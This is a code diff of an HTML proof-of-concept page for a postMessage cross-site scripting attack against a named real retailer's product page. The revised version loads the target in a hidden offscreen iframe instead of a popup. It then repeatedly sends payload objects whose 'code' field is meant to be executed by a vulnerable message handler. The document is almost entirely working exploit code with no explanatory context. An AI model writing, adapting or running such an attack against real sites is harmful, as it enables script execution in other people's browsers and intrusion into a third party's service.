@@ -1,34 +1,31 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>postMessage PoC</title>
-<body>
-<button id="go">Open target & send payload</button>
-<script>
-const TARGET = "https://www.weber.com/US/en/smoquepelletgrill.html";  // change if needed
-const DURATION_MS = 15000;   // how long to retry sending
-const INTERVAL_MS = 400;     // how often to send
+<title>postMessage XSS PoC (no popups)</title>
 
-// Candidate payloads (tweak/add if handler checks 'type' or similar)
+<iframe id="victim" src="https://www.weber.com/US/en/smoquepelletgrill.html"
+        style="width:1px;height:1px;border:0;position:fixed;left:-9999px;top:-9999px;"></iframe>
+
+<script>
+const FRAME = document.getElementById('victim');
+const DURATION_MS = 15000;   // keep hammering for 15s
+const INTERVAL_MS = 400;
+
+// common payload shapes (some handlers expect JSON string, others an object)
 const payloads = [
-  { isTrusted: true, code: "alert('pwned: ' + document.domain)" },        // raw object
-  JSON.stringify({ isTrusted: true, code: "alert('pwned JSON: ' + document.domain)" }) // stringified
-  // Add variants if you see extra checks in code, e.g.:
-  // { isTrusted: true, type: "exec", code: "alert('exec')" }
+  { isTrusted: true, code: "alert('pwned: '+document.domain)" },
+  JSON.stringify({ isTrusted: true, code: "alert('pwned JSON: '+document.domain)" })
+  // Add variants if the code checks fields like {type:'exec'} etc.
 ];
 
-document.getElementById('go').onclick = () => {
-  const w = window.open(TARGET, "_blank", "noopener");   // tab handle for postMessage
-  if (!w) { alert("Popup blocked. Allow popups for this site."); return; }
-
+function send() {
   const t0 = Date.now();
   const timer = setInterval(() => {
-    // Stop after duration
     if (Date.now() - t0 > DURATION_MS) { clearInterval(timer); return; }
-    // Fire each payload once per tick
-    for (const p of payloads) {
-      try { w.postMessage(p, "*"); } catch (e) { /* ignore */ }
-    }
+    try { for (const p of payloads) FRAME.contentWindow.postMessage(p, "*"); } catch(e){}
   }, INTERVAL_MS);
-};
+}
+
+// start after the iframe finishes loading
+FRAME.addEventListener('load', send);
 </script>
-</body>
+
